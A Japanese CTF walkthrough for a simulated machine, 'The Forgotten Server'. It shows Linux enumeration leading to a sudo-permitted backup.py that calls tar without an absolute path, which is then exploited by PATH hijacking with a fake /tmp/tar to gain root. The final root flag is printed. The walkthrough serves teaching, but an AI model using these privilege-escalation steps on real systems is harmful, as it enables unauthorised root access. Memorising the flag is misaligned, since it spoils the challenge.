# The Forgotten Server — Walkthrough

> ⚠️ **ネタバレ注意**
>
> このファイルには `The Forgotten Server` の攻略手順が記載されています。
> 自力で攻略したい場合は、クリアしてから読んでください。

---

## 攻略目標

取得するフラグは2つです。

```text
/home/user/user.txt
/root/root.txt
```

最終的な目標はroot権限を取得し、`/root/root.txt`を読むことです。

---

# 1. 初期状態の確認

まず、自分がどこにいるのか確認します。

```bash
pwd
```

続いてホームディレクトリを確認します。

```bash
ls
```

いくつかのファイルが見つかります。

特に以下のファイルを確認します。

```bash
cat README.txt
cat notes.txt
```

---

# 2. ユーザー情報の調査

現在のユーザーを確認します。

```bash
whoami
```

```bash
id
```

ここでは一般ユーザーとしてログインしていることが分かります。

次にホームディレクトリにある履歴ファイルを確認します。

```bash
ls -la
```

`.bash_history` が見つかったら確認します。

```bash
cat .bash_history
```

過去に管理者が実行したコマンドから、サーバー内に存在するメンテナンス用スクリプトについての情報を得られます。

---

# 3. Webディレクトリの調査

サーバー内をさらに探索します。

```bash
cd /var/www/html
ls
```

Webアプリケーションのファイルが存在します。

```bash
cat index.html
```

さらにディレクトリを調査します。

```bash
ls -la
```

`backup` ディレクトリを発見できます。

```bash
cd backup
ls
```

---

# 4. バックアップファイルの確認

バックアップ関連のファイルを調べます。

```bash
cat config.bak
```

ここには過去のWebアプリケーションで使用されていた設定情報が残されています。

また、古いREADMEも確認します。

```bash
cat README.old
```

これらの情報から、サーバー上で定期的にバックアップ処理が実行されていることが分かります。

---

# 5. メンテナンススクリプトの発見

次に、`/opt` 以下を調査します。

```bash
cd /opt
ls
```

`maintenance` ディレクトリを発見します。

```bash
cd maintenance
ls
```

ここに以下のファイルがあります。

```text
backup.py
README.txt
```

READMEを確認します。

```bash
cat README.txt
```

続いてPythonスクリプトを確認します。

```bash
cat backup.py
```

重要なのは以下の部分です。

```python
os.system(
    "tar -czf /var/backups/site.tar.gz /var/www/html"
)
```

ここで`tar`が絶対パスではなく、コマンド名だけで指定されています。

つまり、実行時の`PATH`によって呼び出されるプログラムを制御できる可能性があります。

---

# 6. sudo権限の確認

現在のユーザーが何を`sudo`で実行できるか確認します。

```bash
sudo -l
```

すると、以下のような設定が見つかります。

```text
User user may run the following commands:
    (root) NOPASSWD: /opt/maintenance/backup.py
```

つまり、パスワードなしでroot権限として`backup.py`を実行できます。

ここで重要なのは、

```text
sudo
 ↓
/opt/maintenance/backup.py
 ↓
os.system()
 ↓
tar
```

という実行経路です。

---

# 7. PATH Hijacking

`backup.py`では、

```python
tar
```

を絶対パスで指定していません。

通常なら、

```text
/usr/bin/tar
```

などの正規プログラムが実行されます。

しかし、`PATH`の先頭に自分が作成したプログラムを置くことができれば、

```text
/tmp/tar
```

を先に実行させることができます。

概念的には、

```text
PATH=/tmp:/usr/bin:/bin
```

とすることで、

```text
/tmp/tar
```

→ `/usr/bin/tar`

の順番で検索される状態を作ります。

---

# 8. 偽のtarを作成

まず`/tmp`へ移動します。

```bash
cd /tmp
```

そして`tar`という名前の実行ファイルを用意します。

```bash
touch tar
```

実行権限を付与します。

```bash
chmod +x tar
```

CTFシミュレーターでは、この操作によって悪意のある`tar`を作成した状態として扱われます。

---

# 9. PATHを変更

次にPATHを変更します。

```bash
export PATH=/tmp:/usr/bin:/bin
```

これで`tar`を実行すると、まず`/tmp/tar`が検索される状態になります。

現在のPATHを確認します。

```bash
echo $PATH
```

また、`which tar`などで実行対象を確認できます。

---

# 10. バックアップスクリプトをrootとして実行

準備が完了したら、先ほど確認したスクリプトをsudoで実行します。

```bash
sudo /opt/maintenance/backup.py
```

バックアップ処理がroot権限で実行されます。

このとき、`backup.py`から呼び出された`tar`はPATHの影響を受けます。

その結果、シミュレーター上で権限昇格が成立します。

---

# 11. root権限を確認

権限を確認します。

```bash
whoami
```

```text
root
```

となれば成功です。

さらに、

```bash
id
```

でroot権限を確認できます。

---

# 12. Root Flag

最後にrootフラグを取得します。

```bash
cat /root/root.txt
```

Root Flagが表示されれば完全クリアです。

```text
FORGOTTEN{root_maintenance_complete_91af}
```

---

# 攻略まとめ

今回の攻撃経路をまとめると以下のようになります。

```text
Linux Enumeration
        ↓
Web Directory Discovery
        ↓
Backup Configuration
        ↓
Maintenance Script
        ↓
sudo -l
        ↓
backup.py
        ↓
os.system("tar ...")
        ↓
PATH Hijacking
        ↓
Malicious tar
        ↓
sudo backup.py
        ↓
root
        ↓
/root/root.txt
```

---

# 学べるポイント

このCTFでは、以下のようなLinuxペネトレーションテストの基本を扱っています。

* ファイルシステムの列挙
* 隠しファイルの確認
* バックアップファイルの調査
* 設定ファイルの調査
* コマンド履歴の確認
* メンテナンススクリプトの解析
* `sudo -l`
* `sudo`による特権実行
* `os.system()`の危険性
* 相対的なコマンド呼び出し
* `PATH`環境変数
* PATH Hijacking
* Linux権限昇格

---

## 攻略のポイント

このマシンでは、単純に「怪しいファイル」を探すだけではなく、

> **「root権限で実行されるプログラムが、何を実行しているのか」**

を見ることが重要です。

特に、

```python
os.system("tar ...")
```

のような**絶対パスを使用していない外部コマンド実行**は、権限昇格につながる可能性があります。

CTFでは、`sudo -l`で許可されているプログラムを見つけたら、

```text
「このプログラムをrootで実行したら何が起きる？」
```

という視点でソースコードを確認することが重要です。
